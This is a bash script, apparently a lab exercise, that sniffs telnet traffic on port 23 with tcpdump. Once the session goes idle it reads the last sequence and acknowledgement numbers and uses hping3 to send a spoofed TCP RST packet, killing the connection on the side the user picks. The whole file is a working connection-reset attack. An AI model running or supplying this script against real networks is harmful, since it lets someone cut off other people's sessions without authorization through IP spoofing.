#!/bin/bash

INTERFACE="enp0s3"
LOG_FILE="/tmp/ssh_monitor.log"
DUMP_FILE="/tmp/ssh_packet_data.txt"

cleanup() {
    echo ""
    kill $TCPDUMP_PID 2>/dev/null
    rm -f $LOG_FILE $DUMP_FILE
    exit
}
trap cleanup SIGINT SIGTERM

read -p "Enter Interface. default: eth0 " input_iface
if [ ! -z "$input_iface" ]; then INTERFACE=$input_iface; fi

read -p "Whom do you want to kill? Server or Client: Enter S or C" TARGET_OPT
TARGET_OPT=${TARGET_OPT^^} # Uppercase

if [[ "$TARGET_OPT" != "S" && "$TARGET_OPT" != "C" ]]; then
    echo "Enter valid option."
    exit 1
fi

tcpdump -i $INTERFACE -n -S -l -tt tcp port 23 > $LOG_FILE 2>/dev/null &
TCPDUMP_PID=$!

tail -f $LOG_FILE | while read line; do
    if echo "$line" | grep -q "length 0"; then
        echo "    $line" | awk '{printf "    Time: %s\n    Src: %s > Dst: %s\n    Flags: %s\n    Seq: %s\n    Ack: %s\n", $1, $3, $5, $7, $9, $11}'
    fi
done &
TAIL_PID=$!

LAST_SEEN_TIME=$(date +%s)
STABILIZED=false

while true; do
    sleep 1
    
    LAST_PACKET_LINE=$(tail -n 1 $LOG_FILE 2>/dev/null)
    
    if [ -z "$LAST_PACKET_LINE" ]; then
        continue
    fi
    
    LAST_PACKET_TS=$(echo $LAST_PACKET_LINE | awk '{print $1}' | cut -d. -f1)
    CURRENT_TS=$(date +%s)
    
    if [ ! -z "$LAST_PACKET_TS" ]; then
        DIFF=$((CURRENT_TS - LAST_PACKET_TS))
    else
        DIFF=0
    fi
    
    if [ $DIFF -lt 30 ]; then
        if [ "$STABILIZED" = true ]; then
            echo "Resetting timer..."
            STABILIZED=false
        fi
    elif [ $DIFF -ge 30 ] && [ "$STABILIZED" = false ]; then
        echo ""
        echo "Connection Stabilized"
        STABILIZED=true
        
        SRC_FULL=$(echo $LAST_PACKET_LINE | awk '{print $3}')
        DST_FULL=$(echo $LAST_PACKET_LINE | awk '{print $5}' | sed 's/://g')
        
        SRC_IP=${SRC_FULL%.*}
        SRC_PORT=${SRC_FULL##*.}
        DST_IP=${DST_FULL%.*}
        DST_PORT=${DST_FULL##*.}
        
        SEQ_NUM=$(echo $LAST_PACKET_LINE | grep -o 'seq [0-9]*' | awk '{print $2}')
        ACK_NUM=$(echo $LAST_PACKET_LINE | grep -o 'ack [0-9]*' | awk '{print $2}')
        PAYLOAD_LEN=$(echo $LAST_PACKET_LINE | grep -o 'length [0-9]*' | awk '{print $2}')

        if [ -z "$SEQ_NUM" ]; then SEQ_NUM=0; fi
        if [ -z "$ACK_NUM" ]; then ACK_NUM=0; fi
        if [ -z "$PAYLOAD_LEN" ]; then PAYLOAD_LEN=0; fi

        ATTACK_SRC_IP=""
        ATTACK_DST_IP=""
        ATTACK_PORT_SRC=""
        ATTACK_PORT_DST=""
        ATTACK_SEQ=""

        if [ "$SRC_PORT" == "23" ]; then
            if [ "$TARGET_OPT" == "C" ]; then
                ATTACK_SRC_IP=$SRC_IP
                ATTACK_DST_IP=$DST_IP
                ATTACK_PORT_SRC=$SRC_PORT
                ATTACK_PORT_DST=$DST_PORT
                ATTACK_SEQ=$((SEQ_NUM + PAYLOAD_LEN)) 
            else
                ATTACK_SRC_IP=$DST_IP
                ATTACK_DST_IP=$SRC_IP
                ATTACK_PORT_SRC=$DST_PORT
                ATTACK_PORT_DST=$SRC_PORT
                ATTACK_SEQ=$ACK_NUM
            fi
        else
            if [ "$TARGET_OPT" == "S" ]; then
                ATTACK_SRC_IP=$SRC_IP
                ATTACK_DST_IP=$DST_IP
                ATTACK_PORT_SRC=$SRC_PORT
                ATTACK_PORT_DST=$DST_PORT
                ATTACK_SEQ=$((SEQ_NUM + PAYLOAD_LEN))
            else
                ATTACK_SRC_IP=$DST_IP
                ATTACK_DST_IP=$SRC_IP
                ATTACK_PORT_SRC=$DST_PORT
                ATTACK_PORT_DST=$SRC_PORT
                ATTACK_SEQ=$ACK_NUM
            fi
        fi

        echo "Spoofing IP   $ATTACK_SRC_IP"
        echo "Target IP     $ATTACK_DST_IP"
        echo "Spoofing Port $ATTACK_PORT_SRC"
        echo "Target Port   $ATTACK_PORT_DST"
        echo "Sequence Num  $ATTACK_SEQ"
        hping3 -c 1 -R -s $ATTACK_PORT_SRC -p $ATTACK_PORT_DST -a $ATTACK_SRC_IP -M $ATTACK_SEQ $ATTACK_DST_IP > /dev/null 2>&1
        
        echo "Connection Terminated."
        kill $TAIL_PID 2>/dev/null
        cleanup
    fi
done